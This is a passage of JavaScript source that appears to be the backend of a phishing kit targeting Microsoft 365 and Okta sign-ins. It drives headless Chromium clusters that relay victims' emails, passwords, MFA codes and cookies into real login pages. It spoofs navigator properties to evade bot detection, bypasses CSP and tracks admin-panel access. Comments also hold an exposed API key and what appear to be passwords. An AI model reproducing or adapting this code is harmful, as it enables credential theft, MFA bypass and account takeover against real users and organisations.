if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('TimeoutSelector => while() break');break;}

}
if(!StOp){
console.log('wait for SelectedAUTH timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='CodeNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
}else{
ResultByIds[Id][EmAiL][MoDe]['auth']['action']='Completed';
ResultByIds[Id][EmAiL][MoDe]['auth']['time']=Date.now();    
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe][MfAcOdE]=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
};
//console.timeEnd('while('+RandArr[10]+')');
return SelectedAUTH;
}

async function waitForPASS(Id,EmAiL,MoDe,TyPe,BeGiNtImE=Date.now(),TiMeOuT=120000,WaItTiMe=1000,page,TimeoutSelector){
//let TyPe = 'email';
let i=0;
let StOp = false;
let OktaPASS = false;
//&&new Date().getTime() < BeginTime.getTime()+limiteTime
console.log('date now: '+Date.now()+' | BeGiNtImE: '+BeGiNtImE +' | TiMeOuT: '+TiMeOuT);
while(!StOp&&Date.now()< (BeGiNtImE + TiMeOuT)){//&&i<30      //Date.now()< BeGiNtImE + TiMeOuT
console.log('waiting......'); 
await page.waitForTimeout(WaItTiMe*2);
i++;

//function sleep(){console.log('exucute sleep');}
//await setTimeout(sleep, 2000);

//setTimeout(() => {console.log("sleep 1500ms");}, 1500);

try{if (ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== false){console.log('username : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]["username"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']['username']));}}catch(ee){console.log('err:'+ee);console.log('+++ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]+++');}
      
//console.log("ResultByIds:++",JSON.stringify(ResultByIds,null,2));
if(typeof ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== 'undefined'&& ResultByIds[Id][EmAiL][MoDe]['user']['username'] !== false&&typeof ResultByIds[Id][EmAiL][MoDe]['user']['time']!== 'undefined'&&ResultByIds[Id][EmAiL][MoDe]['user']['time']!== false&&BeGiNtImE<ResultByIds[Id][EmAiL][MoDe]['user']['time']){
     //,"Time":new Date().toUTCString()
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
        console.log('user : ResultByIds["'+Id+'"]["'+EmAiL+'"]["'+MoDe+'"]["user"]:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']));
       //ResultByIds[Id]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
        OktaPASS = ResultByIds[Id][EmAiL][MoDe]['user']['username'];
        ResultByIds[Id][EmAiL][MoDe]['user']['username']=false;
        ResultByIds[Id][EmAiL][MoDe]['user']['retry']=true;
        ResultByIds[Id][EmAiL][MoDe]['user']['result']="FoundUser";
        //ResultByIds[Id][EmAiL][MoDe]['user']['time']=false;
        console.log('OktaPASS => ResultByIds:'+JSON.stringify(ResultByIds[Id][EmAiL][MoDe]['user']));
        console.log('OktaPASS:'+OktaPASS);
        StOp = true;
        console.log('StOp = true....');
        console.log('finished....');
    }

if(TimeoutSelector&&await page.$(TimeoutSelector) !== null){console.log('TimeoutSelector => while() break');break;}

}
if(!StOp){
console.log('wait for pass timeout');
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='CodeNotFound';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
}else{
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe][MfAcOdE]=false;
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['result']='';
//ResultByIds[Id][EmAiL][MoDe]['mfa'][TyPe]['retry']='';
};
//console.timeEnd('while('+RandArr[10]+')');
return OktaPASS;
}



//////////start declare global string //////////
//var userAgentstring = getRndUserAgent();
var RndUserAgent = getRndUserAgent();
console.log('Public User-Agent:',RndUserAgent)
var valtoRestart = ['0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0'];
var browserWSEndpoint=false;
var requestHEADERS = { };
var requestPOSTDATA = { };
var jsonBODYid = '';
var jsonBODYidProxy = '';
var cookiedropboxkey = '';
var postcookie=false;
var ResultByIds = {};
var RandArr = [];
while(RandArr.length < 100){
    var r = Math.floor(100000+Math.random() * 900000) + 1;
    if(RandArr.indexOf(r) === -1) RandArr.push(r);
}
var RandArray = [];
while(RandArray.length < 200){
    var r = Math.floor(100000+Math.random() * 900000) + 1;//Math.floor(Math.random() * 10000000) + 1
    if(RandArray.indexOf(r) === -1) RandArray.push(r);
}

//////////end declare global string //////////

/*
var parseUrl = function(url) {
    url = decodeURIComponent(url)
    if (!/^(?:f|ht)tps?\:\/\//.test(url)) {
        url = 'http://' + url;
    }

    return url;
};
*/

/*app.use(function (err, req, res, next) {
    if(err){console.log("error:"+err);}
console.log("app.use:");
    res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
    res.header('Expires', '-1');
    res.header('Pragma', 'no-cache');
    res.setHeader('Access-Control-Allow-Origin', 'https://superfastchecker.com');
    next()
});
*/
app.use(function(err, req, res, next) {
  console.error('Something broke!:',err.stack);
  res.status(500).send('Something broke!');
});
//app.use(express.json());
//app.use(express.urlencoded({ extended: false }));

 //const fs = require('fs'); 
 //const favicon = fs.readFileSync(__dirname+'/public/favicon.ico'); // read file
 const favicon = new Buffer.from('AAABAAEAEBAQAAAAAAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA/4QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEREQAAAAAAEAAAEAAAAAEAAAABAAAAEAAAAAAQAAAQAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD8HwAA++8AAPf3AADv+wAA7/sAAP//AAD//wAA+98AAP//AAD//wAA//8AAP//AAD//wAA', 'base64'); 
 app.get("/favicon.ico", function(req, res) {
  res.statusCode = 200;
  res.setHeader('Content-Length', favicon.length);
  res.setHeader('Content-Type', 'image/x-icon');
  res.setHeader("Cache-Control", "public, max-age=2592000");// expiers after a month
  res.setHeader("Expires", new Date(Date.now() + 2592000000).toUTCString());
  res.end(favicon);
	 console.log("req1:",req.url);
 });

app.use(function (req, res, next) {
    // Website you wish to allow to connect
    res.setHeader('Access-Control-Allow-Origin', '*');

    // Request methods you wish to allow
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

    // Request headers you wish to allow
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

    // Set to true if you need the website to include cookies in the requests sent
    // to the API (e.g. in case you use sessions)
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Content-Type', 'application/json');
console.log("req2:",req.url);
    
    //const space = ' ';
    let isFinished = false; let isDataSent = false;
// Only extend the timeout for API requests 
if (!req.url.includes('id=')) { next(); return; }
res.once('finish', () => { isFinished = true; });
res.once('end', () => { isFinished = true; });
res.once('close', () => { isFinished = true; });
res.on('data', (data) => { 
    // Look for something other than our blank space to indicate that real 
// data is now being sent back to the client. 
if (data !== ''&&data !== ' ') { isDataSent = true; } });

const waitAndSend = (timeooot=25000,space,WContinue,looptime,loopend) => { setTimeout(() => { 
// If the response hasn't finished and hasn't sent any data back.... 
if (!isFinished && !isDataSent) { 
// Need to write the status code/headers if they haven't been sent yet.
//if (!res.headersSent) {/*res.status(200);*/res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin':'*'});   
/*res.writeHead(200, {
  "Content-Type": "text/event-stream",
  "Cache-Control": "no-cache",
  "Content-Encoding": "chunked"
});    
*/    
//}//res.setHeader('Content-Type', 'application/json');

//res.end('');
 
if(!WContinue){ res.writeContinue();console.log("res.writeContinue()"+(looptime*25)+"seconds");}else{res.write(space);console.log("res.write(space)"+(looptime*25)+"seconds");}
if(looptime>=loopend/*24x25000ms=10min*/){ return next();/*res.end();*/}
// Wait another 15 seconds 
//let loop=loop+1
waitAndSend(50000,' ',true,looptime+2,loopend); }else{console.log("res.end()"+(looptime*25)+"seconds");return next();} }, timeooot); };
waitAndSend(25000,'',false,1,24);
next(); });

/*req.connection.on('close',function(){    
  // code to handle connection abort
  console.log('user cancelled');
});*/


// This is where we'll put the code to get around the tests.
const preparePageForTests = async (page,userAgent) => {
/*  // Pass the User-Agent Test.
  const userAgent = 'Mozilla/5.0 (X11; Linux x86_64)' +
    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.39 Safari/537.36';
*/
  await page.setUserAgent(userAgent);
  //console.log('userAgent:'+userAgent)
  // Pass the Webdriver Test.
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', {
      get: () => false,
    });
  });

  // Pass the Chrome Test.
  await page.evaluateOnNewDocument(() => {
    // We can mock this in as much depth as we need for the test.
    window.navigator.chrome = {
      runtime: {},
      // etc.
    };
  });

  // Pass the Permissions Test.
  await page.evaluateOnNewDocument(() => {
    const originalQuery = window.navigator.permissions.query;
    return window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
  });

  // Pass the Plugins Length Test.
  await page.evaluateOnNewDocument(() => {
    // Overwrite the `plugins` property to use a custom getter.
    Object.defineProperty(navigator, 'plugins', {
      // This just needs to have `length > 0` for the current test,
      // but we could mock the plugins too if necessary.
      get: () => [1, 2, 3, 4, 5],//, 6
    });
  });

  // Pass the Languages Test.
  await page.evaluateOnNewDocument(() => {
    // Overwrite the `plugins` property to use a custom getter.
    Object.defineProperty(navigator, 'languages', {
      get: () => ['en-US'],//, 'fr'
    });
  });
}

/*	if( !browserWSEndpoint){ 
(async () => {
            const browser = await puppeteer.launch({
           args: ['--no-sandbox', '--disable-setuid-sandbox']
            });
         

  browserWSEndpoint = browser.wsEndpoint();
  console.log('1'+browserWSEndpoint);
})();

 }
*/




console.log('NewclusterLanuch');
const launchOptions = {
    headless: true,
    //devtools: false,
    ignoreHTTPSErrors: true,        // 忽略证书错误
    //waitUntil: 'networkidle2',
    timeout: 0,
    defaultViewport:{
        width: 1920,
        height: 1080
        //width: 640,
        //height: 480
    },
    /*args: [
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--disable-web-security',
        '--disable-xss-auditor',    // 关闭 XSS Auditor
        '--no-zygote',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--allow-running-insecure-content',     // 允许不安全内容
        '--disable-webgl',
        '--disable-popup-blocking',
        //'--proxy-server=http://127.0.0.1:8080'      // 配置代理
    ],*/
    args: [
        '--no-sandbox',
        '--disable-web-security',
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--disable-setuid-sandbox',
        '--allow-running-insecure-content',
        '--no-first-run',
        '--no-zygote',
        //'--deterministic-fetch',
        //'--disable-features=IsolateOrigins',
        //'--disable-site-isolation-trials',
        '--shm-size=500mb',
        //'--disable-infobars',
        //'--window-size=1366,768'
         //'--single-process',
    ],
    //"executablePath": "Chromium_OSX.app/Contents/MacOS/Chromium",       // 配置chromium路径

};        
const clusterLanuchOptions = {
    concurrency: Cluster.CONCURRENCY_CONTEXT,//CONCURRENCY_BROWSER
    maxConcurrency: 3,
    retryLimit: 0,   // 重试次数
    //skipDuplicateUrls: true,  // 不爬重复的url
    //monitor: true,  // 显示性能消耗
    timeout:800000,//milliseconds//300000
    puppeteerOptions: launchOptions
};            
            
const cluster = await Cluster.launch(/*{
        concurrency: Cluster.CONCURRENCY_BROWSER,
        maxConcurrency: 4,
    }*/clusterLanuchOptions);

    // setup the function to be executed for each request
    await cluster.task(async ({ page, data, worker}) => {
var RndUserAgent = getRndUserAgent();
console.log('User-Agent:',RndUserAgent)
//const reqemail='brahimEL@exrobtos.onmicrosoft.com';
//url=data.reqquery[0];
const GetSessionIP = false;
if(data.checklogin){
const dataurl=data.requrl;
const dataemail=data.reqemail;
const datapass=data.reqpass;//'aJ6QVibgsJt.udd';


//await page.setViewport({width: 1366, height: 768});
//await page.setUserAgent(RndUserAgent);
await preparePageForTests(page,RndUserAgent);
// set the HTTP Basic Authentication credential
await page.authenticate({'username':dataemail, 'password': datapass});

// go to website that protected with HTTP Basic Authentication
const response = await page.goto(dataurl,{waitUntil: 'networkidle2'});
const pageContent = await page.content();
const pageheaders = response.headers();
console.log(pageheaders);
console.log(pageContent);
console.log(response.text());
return response;



}else if(data.checksaml){
    
    console.log("worker:",worker);
const dataEmail=data.reQemail;    
if(dataEmail.includes("exrobotos.net")){ 
    console.log('https://trial-1446194.okta.com');
    var dataUrl='https://trial-1446194.okta.com';
    //console.log('https://trial-8563555.okta.com');
    //var dataUrl='https://trial-8563555.okta.com';//data.reQurl;
    //console.log('https://trial-9485326.okta.com');
    //var dataUrl='https://trial-9485326.okta.com';//data.reQurl;
    //var dataPass = 'GC38EsItgRFdR';
    
    console.log('okta.com okta-emea.com okta-gov.com okta.mil oktapreview.com');
}else{
 var dataUrl='https://login.microsoftonline.com/';//data.reQurl; 
 //var dataPass = '123456';
}
console.log('checksaml:',data.checksaml);


//const dataPass=data.reQpass;//'aJ6QVibgsJt.udd';
const dataDebug=data.reQdebug;//'true';
const dataId=data.reQid;
const dataToken=data.reQtoken;
const dataSetcookie=data.reQsetcookie;
console.log('setcookie :',dataSetcookie);
const dataGetcookie=data.reQgetcookie;
const dataCookie=data.reQcookie;
const dataSendresponse=data.reQres;
const dataUserIP=data.reQUserIP;
const dataUserUA=data.reQUserUA;
const dataServerIP=data.reQServerIP;
const dataServerHOST=data.reQServerHOST;
const dataMfaType=data.reQMfaType;
const dataMfaDefaultType=data.reQMfaDefaultType;
const dataAppID=data.reQappID;
const dataAdminPanel=data.reQadminLink;
//const SessionIP=data.reqSessionIP;
var StartTime = new Date();
var StartTime2 = data.reQtime;
var DateNow = new Date().toUTCString();
var result = {};
var cookies = false;
var admincookies = false;
var successlogin = false;
var IsAdmin = false;
var IsLoggedToAdmin = false;
var PickAnAccount = false;
var IsO365 = false;
var IsSAML = false;
var IsOKTA = false;
var SAML = false;
var SAML_user = false;
var SAML_pass = false;
var SAML_admin = false;
var AccountTYPE = false;
var OktaCode = false;
var OktaUser = false;
var OktaLogin = false;
var OktaResult={'user':{'ok':'CorrectUser','no':'WrongUser','timeout':'UserNotFound','failed':'UserFailed'},'login':{'ok':'CorrectLogin','no':'WrongLogin','timeout':'LoginNotFound','failed':'LoginFailed'},'pass':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'sms':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'otp':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'cotp':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'totp':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'gotp':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'},'push':{'ok':'PushAppOk','no':'PushAppDenied','timeout':'PushNoResponse','failed':'PushFailed'},'gpush':{'ok':'PushAppOk','no':'PushAppDenied','timeout':'PushNoResponse','failed':'PushFailed'},'email':{'ok':'CorrectCode','no':'WrongCode','timeout':'CodeNotFound','failed':'CodeFailed'}};
var OktaTypeArr = {};
var LoginStatus = false;
var OktaType = false;
var isCorrectLogin = false;
var stylesheetcss = false;
var imagesEnabled = true;
var fontsEnabled = false;
var stylesheetEnabled = true;
var insertIntoAdminDatabase = true;
var insertIntoUserDatabase = true;

    //http://ip.jsontest.com/UserCOUNTRY,
    //https://extreme-ip-lookup.com/json/41.140.216.133?callback=&key=Qn97RtiI2gwjStzJJjuG
    //http://www.geoplugin.net/json.gp?ip=89.187.163.175
    //https://api.ipify.org :: GET
    //https://api64.ipify.org/
    //http://ip.jsontest.com/
    //http://headers.jsontest.com/?service=ip
/*
try{
SessionIP = await page.evaluate(() => {return fetch("https://api.ipify.org").then(function(response) { return response.text(); });});
}catch(err){SessionIP = "unknown";console.log('err:'+err);}
console.log("Nodejs Server IP: "+SessionIP);
*/

var SessionIP = false;
var SessionCOUNTRY = false;
var SessionCOUNTRYCode = false;

var SessionLocation = false;
try{
SessionLocation = await fetch(`https://extreme-ip-lookup.com/json/?key=Qn97RtiI2gwjStzJJjuG`,{cache: "no-cache"}).then(function(response) { return response.json(); }).then(function(json) {if(json&&json.status&&json.status=="success"){const SLocation = [];SLocation['ip']=json.query;SLocation['country']=json.country;SLocation['countryCode']=json.countryCode; return SLocation;}else{return false;} });
if(SessionLocation){
SessionIP = SessionLocation["ip"];
SessionCOUNTRY = SessionLocation["country"];
SessionCOUNTRYCode = SessionLocation["countryCode"];
}
console.log('SessionIP:'+SessionIP);
console.log('SessionCOUNTRY:'+SessionCOUNTRY);
console.log('SessionCOUNTRYCode:'+SessionCOUNTRYCode);
}catch(err){console.log('err:'+err);}


//var AccountTYPE = "OF365";





ResultByIds[dataId][dataEmail]['okta']['action'] = "Pending";


await page.setRequestInterception(true);
page.on('request', request => {
        if ((!imagesEnabled && ['image'].indexOf(request.resourceType()) !== -1) || (!fontsEnabled && ['font'].indexOf(request.resourceType()) !== -1) || (!stylesheetEnabled&&['stylesheet'].indexOf(request.resourceType()) !== -1)) {
                request.abort();//block request
            }else if(request.isNavigationRequest() && (request.resourceType() === 'document'/*||request.resourceType() === 'xhr'*/)) {//xhr, fetch
           console.log("request : "+request.url())
        
                request.continue();
            }else{
                console.log("request  : "+request.url())
        request.continue()
            }
    });



page.on('response', async response => {
if(response.url().includes('style-sheet?touch-point=SIGN_IN_PAGE')){console.log("style-sheet link: "+response.url());
try{
if(await response.text()){stylesheetcss=await response.text();console.log("Response CSS: "+stylesheetcss);}
}catch(ee){console.log("response css Err: "+ee);}


}
  });
  
  
page.on('console', (msg) =>{if(msg.text()!=='Failed to load resource: net::ERR_FAILED'&&!msg.text().includes('JQMIGRATE: Migrate is installed')&&!msg.text().includes('was preloaded using link')&&!msg.text().includes('Failed to load resource')&&!msg.text().includes('Axios response') ){ console.log(msg.text())}});



var failUser = false;
await page.setDefaultTimeout(15000);

//var setcookie=true;
//var getcookie=true
//RndUserAgent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36';
console.log('RndUserAgent:'+RndUserAgent);
await preparePageForTests(page,RndUserAgent);
//await page.goto(dataurl,{waitUntil: 'networkidle2'});
/*await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36');
await page.setViewport({
   width: 1080,
   height: 1080,
  });
  */
await page.setBypassCSP(true);
if(dataSetcookie && dataCookie){
await page.setCookie(...dataCookie);//cookie
}  
const response = await page.goto(dataUrl);
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
const userAgent = await page.evaluate(() => navigator.userAgent );
console.log('userAgent:'+userAgent);

if(!dataCookie){
    await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'urlPassed',dataDebug,false);

try{await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes("login.microsoftonline.com/")||window.location.href.includes(".okta.com/")) && (document.querySelector('input[name=loginfmt]') || document.querySelector('input[type=text]') || document.querySelector('input[type=password]')||document.querySelector('#tilesHolder'))`);console.log('url passed')}catch(e){console.log('fail url unknown error, catch err:'+e);}


//first pick account new
//role="listitem"
//div[role=listitem]
if(await page.$('#tilesHolder') !== null && await page.$('#otherTile') !== null){
//   choose account
console.log('Pick an account1');
PickAnAccount = await page.waitForSelector("#tilesHolder").then(async() => { console.log("loginpass.."); page.click("#otherTile");/*await navigationPromise;*//*await page.waitForNavigation('networkidle0');*/console.log("Success Pick Work or school account");await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes(".okta.com"))||(window.location.href.includes("login.microsoftonline.com/")&&( document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| document.querySelector('#loginDescription') || document.querySelector('input[type=text]') || document.querySelector('input[type=password]')))||!window.location.href.includes("login.microsoftonline.com/")`); console.log('Pick an account Passed');return true; }).catch(e => { console.log("Pick an account catch err:"+e); return false; });
console.log('PickAnAccount:'+PickAnAccount);


}

//first pick account new


  var smsRecovery = true;
  var callRecovery = true;
  var emailRecovery = true;    

//await page.waitForSelector("input[name=loginfmt]");    
if(await page.$('input[name=loginfmt]') !== null){
    //await page.waitForSelector("input[name=loginfmt]");
    await page.waitForSelector("input[type=submit]");
    //await page.click("input[name=loginfmt]",{clickCount: 3});
    await page.$eval('input[name=loginfmt]', el => el.value = '');
    await page.type("input[name=loginfmt]",dataEmail,{delay:25});
    console.log('email puted to office');
    page.click("input[type=submit]");
    console.log('Submit Email To Office Passed');
    
    await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'SubmitEmailToOfficePassed',dataDebug,false); 

}    
 
    
    //await page.click("input[type=submit][value=Next]");
    //await page.waitForNavigation();
var SamlUrl='noooooooon';//Redirect_uri
try{await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes(".okta.com")||window.location.href.includes(".okta-emea.com")||window.location.href.includes(".okta-gov.com")||window.location.href.includes(".okta.mil")||window.location.href.includes(".oktapreview.com")||document.querySelector('.okta-container'))||(window.location.href.includes("login.microsoftonline.com/")&&( document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| document.querySelector('#loginDescription') || document.querySelector('input[type=text]') || window.getComputedStyle(document.querySelector('input[type=password]'), null).getPropertyValue('overflow')!=='hidden'|| document.querySelector('#aadRedirectCancel')))||!window.location.href.includes("login.microsoftonline.com/")`);console.log('waitForFunctionPassed');}catch(e){failUser=true;console.log('fail email puted unknown error, catch err:'+e);}

    //const chain = response.request().redirectChain();
//console.log('redirect length:',chain.length); // Return 1
//console.log('redirect link:',chain[0].url()); // Return string 'http://example.com'

/*
    try{await page.waitForFunction("document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| document.querySelector('#loginDescription')");  }catch(e){faillogin=true;
    //wrongemail=true;
    console.log('fail login unknown error about email, catch err:'+e);}
*/
   
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'waitForFunctionPassed2',dataDebug,false); 


if(await page.$('#loginDescription') !== null&&await page.$('#aadTile') !== null){
// #aadTile    Work or school account
// #msaTile    Personal account
console.log('Pick an account2');
PickAnAccount = await page.waitForSelector("#aadTile").then(async() => { console.log("loginpass.."); page.click("#aadTile");/*await navigationPromise;*//*await page.waitForNavigation('networkidle0');*/console.log("Success Pick Work or school account");await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes(".okta.com")||window.location.href.includes(".okta-emea.com")||window.location.href.includes(".okta-gov.com")||window.location.href.includes(".okta.mil")||window.location.href.includes(".oktapreview.com")||document.querySelector('.okta-container'))||(window.location.href.includes("login.microsoftonline.com/")&&( document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| !document.querySelector('#loginDescription') || document.querySelector('input[type=text]') || window.getComputedStyle(document.querySelector('input[type=password]'), null).getPropertyValue('overflow')!=='hidden' || document.querySelector('#aadRedirectCancel') ))||!window.location.href.includes("login.microsoftonline.com/")`);  console.log('Pick an account Passed');return true;}).catch(e => { console.log("Pick an account catch err:"+e); return false; });
console.log('PickAnAccount:'+PickAnAccount);


}


await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'PickAnAccount2',dataDebug,false); 


//https://login.microsoftonline.com/

/*
try{await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes("login.microsoftonline.com/")||window.location.href.includes(".okta.com/")) && (document.querySelector('input[name=loginfmt]') || document.querySelector('input[type=text]') || document.querySelector('input[type=password]'))`);console.log('url passed')}catch(e){console.log('fail url unknown error, catch err:'+e);}
*/


//var curenturl = await page.evaluate("() => window.location.href");
var curenturl = await page.url();
console.log('curenturl:',curenturl);

if(curenturl.includes("login.microsoftonline.com/") && await page.$('#aadRedirectCancel')){
console.log("Taking you to your organization's sign-in page"); 

try{
await page.waitForFunction(`(window.location.href.includes("${SamlUrl}")||window.location.href.includes(".okta.com")||window.location.href.includes(".okta-emea.com")||window.location.href.includes(".okta-gov.com")||window.location.href.includes(".okta.mil")||window.location.href.includes(".oktapreview.com")||document.querySelector('.okta-container'))||(window.location.href.includes("login.microsoftonline.com/")&&( document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| document.querySelector('#loginDescription') || document.querySelector('input[type=text]') || document.querySelector('input[type=password]')  ))||!window.location.href.includes("login.microsoftonline.com/")`);
console.log("redirecting function passed");
}catch(e){
console.log("redirecting function error"+e);    
}
}    


curenturl = await page.url();
console.log('curenturl:',curenturl);
if(curenturl.includes("login.microsoftonline.com/") && await page.$('input[type=password]')){
    console.log("Email is not Okta account");
    console.log('Email is office 365 account');   
    console.log('login Page:',curenturl);
    
    AccountTYPE = "OF365";
    IsO365 = true;
    

var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 0;
					result['Status'] = "NotOkta";
					result['Email'] = dataEmail;
					result['Msg'] = "Email Is Not Okta Account";
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);    
    
    
    
    
    
    
    
console.log('Saml:',curenturl); 
    
}else if(curenturl.includes("login.microsoftonline.com/") && (await page.$('#usernameError')||await page.$('#debugDetailsHeader')||await page.$('input[name=loginfmt'))){
    
  AccountTYPE = "OF365";  
  IsO365 = true;  
console.log('username Error');


var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 0;
					result['Status'] = "UsernameError";
					result['Email'] = dataEmail;
					result['Msg'] = "Username Error";
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);    
    
    
    
    
    
    
    
console.log('Saml:',curenturl);    

}else if(await page.$('input[type=password]')&&(curenturl.includes("login.live.com/")||curenturl.includes("outlook.com/"))){
    AccountTYPE = "OF365_PERSONAL";
    IsO365 = true;
  console.log("Email is not Okta account.");
    console.log('Email is a personal office account');   
    console.log('login Page:',curenturl);
    
    
    
    
    

var LoadTime_ms = new Date()-StartTime;
var LoadTime2_ms = new Date()-StartTime2;
//console.log('time1: '+new Date()+' time2: '+new Date());
var LoadTime_s = Math.floor(LoadTime_ms/1000);
var LoadTime2_s = Math.floor(LoadTime2_ms/1000);
                
					result['StatusCode'] = 0;
					result['Status'] = "NotOkta";
					result['Email'] = dataEmail;
					result['Msg'] = "Email Is Not Okta Account";
					result['Load_time'] = LoadTime_s+' Seconds('+LoadTime2_s+'Sec)';
                console.log('Load_time: '+LoadTime_s+' Seconds('+LoadTime2_s+'Sec)');
					result['Time'] = DateNow;
					//result['client_ip'] = $this->client_ip;

					//result['client_ip'] = $this->client_ip;

//var result = { "statusCode": 1, "status": "invalid", "email": email, "result": "Not Valid Gmail Address", "time":DateNow };                  
console.log(result);    
    
    
    
    
    
    
    
console.log('Saml:',curenturl);    
}else if(curenturl.includes(".okta.com")||curenturl.includes(".okta-emea.com")||curenturl.includes(".okta-gov.com")||curenturl.includes(".okta.mil")||curenturl.includes(".oktapreview.com")||await page.$('.okta-container') !== null){
    console.log("Email is Okta account");
AccountTYPE = "OF365_OKTA";
IsOKTA = true;
console.log('Saml:',curenturl);
SAML = curenturl;

//await page.waitForSelector("input[type=text]");
try{await page.waitForFunction(`document.querySelector('input[type=text]') || document.querySelector('input[type=email]') || document.querySelector('input[type=password]')`);console.log('okta url')}catch(e){console.log('fail okta url unknown error, catch err:'+e);}

/*
cs - Czech
da - Danish
de - German
el - Greek
en - English
es - Spanish
fi - Finnish
fr - French
hu - Hungarian
id - Indonesian
it - Italian
ja - Japanese
